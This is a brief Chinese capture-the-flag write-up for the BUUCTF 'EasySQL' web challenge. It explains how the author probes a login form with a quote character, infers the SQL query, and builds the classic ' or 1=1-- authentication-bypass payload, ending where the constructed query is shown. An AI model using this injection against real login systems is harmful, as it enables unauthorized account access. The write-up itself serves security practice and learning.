# BUUCTF-练习场web

题目1：\[极客大挑战 2019\]EasySQL

![](../.gitbook/assets/image%20%28165%29.png)

解答过程：

要求输入用户名与密码，输入错误提示wrong username and password，输入admin'后

![](../.gitbook/assets/image%20%28163%29.png)

因此，猜测字段名为username和password，并猜想其sql语句为

select \* from table where username='admin' and password='admin'

当用户名为admin'时，语句变为：

select \* from table where username='admin'  'and password='admin'

因此可以构造：username=

select \* from table where username='admin' and password=' ' or 1=1-- '



